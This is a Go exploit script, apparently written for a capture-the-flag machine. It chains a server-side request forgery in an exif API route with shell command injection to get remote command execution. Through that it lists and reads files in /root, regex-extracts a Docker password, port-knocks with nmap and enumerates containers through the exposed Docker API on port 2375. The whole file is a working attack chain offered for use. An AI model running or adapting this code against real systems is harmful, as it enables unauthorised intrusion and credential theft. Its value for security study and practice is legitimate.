package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

// DOCKER API Reference: https://docs.docker.com/engine/api/v1.41/#tag/Container

const EnableVirtualTerminalProcessing uint32 = 0x4

var ANSI_SET bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	Domain  string
	baseURL string
	Route   string
	Scheme  string
	Session *http.Client
}

type CookieJar struct {
	jar map[string][]*http.Cookie
}

// ============================================================
// Docker container information structs
// ============================================================

type ContainerMetadata struct {
	Id       string         `json:"Id"`
	Image    string         `json:"Image"`
	Command  string         `json:"Command"`
	PortInfo []PortMetadata `json:"Ports"`
}

type PortMetadata struct {
	IP          string `json:"IP"`
	PrivatePort int    `json:"PrivatePort"`
	PublicPort  int    `json:"PublicPort"`
	Type        string `json:"Type"`
}

// ============================================================
//
// Function Name: GetContainers
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to use the Docker API to pull down info
//  for all the containers on the target machine.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GetContainers() (success bool, message string) {
	var bodycontent []byte
	var containermetadata []ContainerMetadata
	var err error
	var oldbase string = c.baseURL
	var route string = "containers/json"

	c.baseURL = fmt.Sprintf("%s://%s:2375", c.Scheme, c.Domain)

	bodycontent, err = c.GetBodyContent(route)
	if err != nil {
		c.baseURL = oldbase
		return false, err.Error()
	}

	err = json.Unmarshal(bodycontent, &containermetadata)
	if err != nil {
		c.baseURL = oldbase
		return false, err.Error()
	}

	for _, currentcontainer := range containermetadata {
		PrintChar('-', 60)
		InfMsg(fmt.Sprintf("Container ID: %s", currentcontainer.Id))
		InfMsg(fmt.Sprintf("Container Name: %v", currentcontainer.Image))
		InfMsg(fmt.Sprintf("Container Command: %s", currentcontainer.Command))
	}
	PrintChar('-', 60)

	c.baseURL = oldbase

	return true, "all container metadata dumped"
}

// ============================================================
//
// Function Name: GetBodyContent
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take make a GET request to a target
//  route and return the body content to the user.
//
// Input(s):
//
//  route - string. route to make GET request on.
//
// Return(s):
//
//  bodycontent - []byte. content pulled from target URL.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return bodycontent, nil
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (success bool, message string) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "client connection successful"
}

func (c *Client) ExecuteRemoteCommand(command string) (output string, success bool, message string) {
	var bodycontent []byte
	var err error
	var route string = fmt.Sprintf("api/exif?url=http://api-dev-backup:8080/exif?url=http://127.0.0.1:8080;%s", url.QueryEscape(command))

	SysMsgNB("executing remote command")
	bodycontent, err = c.GetBodyContent(route)
	if err != nil {
		return "", false, err.Error()
	}

	output = strings.Split(string(bodycontent), "</html>")[1]

	if len(output) < 1 {
		return "", false, fmt.Sprintf("\"%s\" gave no output", route)
	}

	return output, true, "command executed successfully"
}

func (c *Client) ReadNote() (passwordstring string, success bool, message string) {
	var matches [][]byte
	var regpat string = `[a-zA-Z-]+\.txt`
	var stringcontent string
	var targetdoc string

	stringcontent, success, message = c.ExecuteRemoteCommand("ls -la /root")
	if !success {
		return "", false, message
	}

	re, err := regexp.Compile(regpat)
	if err != nil {
		return "", false, err.Error()
	}

	matches = re.FindAll([]byte(stringcontent), -1)
	if len(matches) < 1 {
		return "", false, "no text documents discovered"
	}
	targetdoc = string(matches[0])

	// If no delay is set, the server gives 503 response
	SysMsgNB("delaying request")
	time.Sleep(5 * time.Second)

	stringcontent, success, message = c.ExecuteRemoteCommand(fmt.Sprintf("cat /root/%s", targetdoc))
	if !success {
		return "", false, "unable to read target document"
	}

	regpat = `password is .*`
	re, err = regexp.Compile(regpat)
	if err != nil {
		return "", false, err.Error()
	}

	matches = re.FindAll([]byte(stringcontent), -1)
	if len(matches) < 1 {
		return "", false, "no text documents discovered"
	}
	passwordstring = strings.ReplaceAll(strings.Split(string(matches[0]), "is")[1], " ", "")

	return passwordstring, true, fmt.Sprintf("docker password: \"%s\"", passwordstring)
}

func KnockPorts(target string, ports []string) (success bool, message string) {
	for i := range ports {
		_, err := exec.Command("nmap", "-p", ports[i], target).Output()
		if err != nil {
			return false, err.Error()
		}
	}
	return true, "ports successfully knocked"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool

	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second}}

	var dockerpass string

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.Parse()

	success, message := ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))
	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL
	client.Domain = domain
	client.Scheme = scheme

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	success, message = client.TestConnection()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	SysMsgNB("delaying request")
	time.Sleep(5 * time.Second)

	//============================================================
	// RCE on target device
	//============================================================
	dockerpass, success, message = client.ReadNote()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)
	InfMsg(dockerpass)

	//============================================================
	// Open the docker port via port knocking.
	//============================================================
	success, message = KnockPorts(domain, []string{"##","##","##","##"})
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	//============================================================
	// Dump info for all docker containers.
	//============================================================
	success, message = client.GetContainers()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	return
}

